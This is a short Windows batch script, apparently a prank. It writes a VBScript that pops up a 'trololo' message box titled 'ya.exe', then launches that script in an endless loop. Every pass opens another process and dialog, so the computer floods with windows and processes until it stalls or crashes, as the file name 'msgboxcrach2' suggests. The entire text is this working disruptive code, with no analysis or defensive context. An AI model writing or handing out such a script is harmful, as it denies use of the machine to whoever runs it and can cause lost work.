@echo off
cls
echo x=msgbox("trololo" ,0, "ya.exe")  >> msgboxcrach2.vbs
:start
start msgboxcrach2.vbs /min
goto start
